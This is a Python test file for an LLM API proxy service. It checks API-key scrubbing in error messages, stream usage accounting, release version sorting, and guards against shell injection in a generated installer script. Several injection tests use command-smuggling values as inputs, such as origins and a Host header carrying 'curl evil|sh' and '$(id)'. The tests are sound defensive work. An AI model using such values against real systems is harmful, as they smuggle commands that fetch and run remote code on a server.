"""Hardening fixes in the /v1 surface: installer shell-injection guard,
stream usage accounting, upstream error scrubbing, and release sort order."""
import asyncio
import json
from unittest import mock

import httpx
import pytest
from fastapi import FastAPI, HTTPException
from fastapi.testclient import TestClient
from starlette.middleware.sessions import SessionMiddleware

from app import api, proxy
from app.config import settings
from app.opencode import install_script, safe_origin
from app.web import dashboard


class _Req:
    def __init__(self, auth=""):
        self.headers = {"Authorization": auth} if auth else {}


def test_bearer_scheme_is_required():
    assert api._bearer(_Req("Bearer sk-test-1234567890")) == "sk-test-1234567890"
    assert api._bearer(_Req("bearer sk-test-1234567890")) == "sk-test-1234567890"
    assert api._bearer(_Req("Basic sk-test-1234567890")) == ""
    assert api._bearer(_Req("sk-test-1234567890")) == ""
    assert api._bearer(_Req("")) == ""


def test_scrub_secrets_strips_token_shapes():
    scrubbed = proxy.scrub_secrets(
        "bad key sk-abcdef0123456789 for https://user:pass@host/x with Bearer eyJhbGciOi.abc"
    )
    assert "sk-abcdef0123456789" not in scrubbed
    assert "pass@host" not in scrubbed
    assert "eyJhbGciOi.abc" not in scrubbed
    # Plain prose survives.
    assert "bad key" in scrubbed and "with" in scrubbed


def test_error_message_scrubs_upstream_secrets():
    body = {"error": {"message": "denied for sk-abcdef0123456789"}}
    assert "sk-abcdef0123456789" not in api._error_message(body)
    obj = proxy._error_object(400, b"auth failed: sk-abcdef0123456789")
    assert "sk-abcdef0123456789" not in obj["error"]["message"]


def test_install_script_rejects_injection_shaped_origins():
    for evil in (
        'https://x.com";curl evil|sh;"',
        "https://x.com';id;:'",
        "https://x.com/$(id)",
        "https://x.com/`id`",
        "https://x.com/ space",
        "ftp://x.com",
        "",
    ):
        assert not safe_origin(evil)
        with pytest.raises(ValueError):
            install_script(origin=evil, api_base="https://x.com/v1")
        with pytest.raises(ValueError):
            install_script(origin="https://x.com", api_base=evil)


def test_install_script_quotes_values_single():
    script = install_script(origin="https://x.com", api_base="https://x.com/v1")
    assert "export FUSE_ORIGIN='https://x.com'" in script
    assert "export FUSE_API='https://x.com/v1'" in script


def test_install_route_refuses_host_header_injection(monkeypatch):
    monkeypatch.setattr(settings, "public_base_url", "", raising=False)
    app = FastAPI()
    app.add_middleware(SessionMiddleware, secret_key=settings.app_secret, https_only=True, same_site="strict")
    from app.web import router as web_router

    app.include_router(web_router)
    client = TestClient(app, base_url="https://testserver")
    resp = client.get("/install-opencode.sh", headers={"host": 'x.com";curl evil|sh;#'})
    assert resp.status_code == 400
    assert "curl evil" not in resp.text
    ok = client.get("/install-opencode.sh")
    assert ok.status_code == 200
    assert "export FUSE_ORIGIN='https://testserver'" in ok.text


def test_release_sort_is_numeric_not_lexical():
    assert dashboard._release_key("Fuse-Setup-1.10.0.exe") > dashboard._release_key("Fuse-Setup-1.9.0.exe")
    assert dashboard._release_key("1.10.0") > dashboard._release_key("1.9.9")
    assert dashboard._release_key("1.9.0") > dashboard._release_key("1.8.0")
    # Same version: deterministic name tiebreak.
    assert dashboard._release_key("1.9.0-b") > dashboard._release_key("1.9.0-a")


def _sse(obj) -> bytes:
    return f"data: {json.dumps(obj)}\n\n".encode()


class _Stream:
    def __init__(self, chunks):
        self._chunks = chunks

    def __aiter__(self):
        return self

    async def __anext__(self):
        if not self._chunks:
            raise StopAsyncIteration
        return self._chunks.pop(0)

    async def aclose(self):
        pass


def test_tap_usage_survives_later_delta_frames():
    """A usage frame mid-stream must not be zeroed by following delta frames."""
    chunks = [
        _sse({"choices": [], "usage": {"prompt_tokens": 10, "completion_tokens": 2}}),
        _sse({"choices": [{"delta": {"content": "x"}}]}),
        _sse({"choices": [{"delta": {"content": "y"}}]}),
        b"data: [DONE]\n\n",
    ]

    async def run():
        with mock.patch("app.api.db.record_usage") as rec:
            async for _ in api._tap(_Stream(chunks), 1, 1, None, "m", provider="grok"):
                pass
            return rec

    rec = asyncio.run(run())
    usage = rec.call_args[0][4]
    assert usage["prompt_tokens"] == 10
    assert usage["completion_tokens"] == 2
    assert rec.call_args.kwargs["request_status"] == "success"


def test_tap_scrubs_inline_stream_errors_and_keeps_usage_past_empty_frames():
    chunks = [
        _sse({"choices": [], "usage": {"prompt_tokens": 10, "completion_tokens": 2}}),
        _sse({"choices": [], "usage": {}}),
        _sse({"error": {"message": "bad key sk-abcdef0123456789 rejected"}}),
        b"data: [DONE]\n\n",
    ]

    async def run():
        with mock.patch("app.api.db.record_usage") as rec:
            out = b"".join([c async for c in api._tap(_Stream(chunks), 1, 1, None, "m")])
            return rec, out

    rec, out = asyncio.run(run())
    assert b"sk-abcdef0123456789" not in out
    assert b"sk-***" in out and out.endswith(b"data: [DONE]\n\n")
    assert rec.call_args[0][4]["prompt_tokens"] == 10
    assert rec.call_args.kwargs["request_status"] == "failed"


def test_tap_records_explicit_unknown_without_usage_frames():
    async def run():
        with mock.patch("app.api.db.record_usage") as rec:
            async for _ in api._tap(_Stream([_sse({"choices": [{"delta": {"content": "x"}}]})]), 1, 1, None, "m"):
                pass
            return rec

    rec = asyncio.run(run())
    assert rec.call_args[0][4]["usage_status"] == "unknown"


def test_openai_chat_collected_usage_survives_later_deltas():
    body = (
        _sse({"choices": [], "usage": {"prompt_tokens": 10, "completion_tokens": 2}})
        + _sse({"choices": [{"delta": {"content": "x"}}]})
        + b"data: [DONE]\n\n"
    )

    def handler(req):
        return httpx.Response(200, content=body, headers={"content-type": "text/event-stream"})

    async def run():
        client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
        status, obj, stream, collected, _ = await proxy.openai_chat(
            client, "http://up/v1/chat/completions", {}, {"model": "m", "messages": [], "stream": True},
            close_client=True,
        )
        async for _ in stream:
            pass
        return status, collected

    status, collected = asyncio.run(run())
    assert status == 200
    assert collected["prompt_tokens"] == 10
    assert collected["completion_tokens"] == 2
    assert collected["stream_status"] == "complete"
